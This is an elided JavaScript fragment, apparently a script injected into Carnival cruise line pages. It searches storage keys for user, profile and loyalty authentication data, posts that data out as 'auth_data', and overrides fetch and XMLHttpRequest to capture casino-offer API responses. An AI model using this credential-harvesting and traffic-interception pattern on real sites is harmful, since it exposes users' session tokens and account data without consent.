(function() {
  ...
  function getCarnivalAuth() {
    try {
      ...
      var carnivalPatterns = ['persist:user', 'profile', 'member', 'vifp', 'loyalty'];
      ...
      if (!authData) {
        for (var ki = 0; ki < keys.length; ki++) {
          if (/user|profile|member|account|vifp|loyalty/i.test(keys[ki])) {
            try {
  ...
  function sendAuth() { post('auth_data', { auth: getAuth() }); }
  ...
  window.fetch = function() {
    ...
    return oF.apply(this, args).then(function(r) {
      try {
        ...
        if (url.indexOf('/api/casino/v2/offers/list') !== -1 || url.indexOf('/api/casino/v2/offers/details') !== -1 || url.indexOf('/api/casino/casino-offers') !== -1)
  ...
  XMLHttpRequest.prototype.send = function() {
    ...
    x.addEventListener('load', function() {
      try {
        ...
        if (u.indexOf('/api/casino/v2/offers/list') !== -1 || u.indexOf('/api/casino/v2/offers/details') !== -1 || u.indexOf('/api/casino/casino-offers') !== -1) post('api_captured', { key: 'offers', data: d });
